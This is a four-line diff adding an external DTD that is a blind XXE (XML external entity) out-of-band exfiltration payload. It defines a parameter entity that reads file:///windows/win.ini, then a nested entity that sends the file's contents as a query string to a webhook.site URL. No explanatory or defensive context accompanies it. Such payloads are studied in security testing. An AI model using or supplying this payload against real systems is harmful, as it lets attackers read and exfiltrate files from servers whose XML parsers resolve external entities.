@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///windows/win.ini">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/07690d22-a36a-4390-8224-20c40deae8bc/?x=%file;'>">
+%eval;
+%exfil;
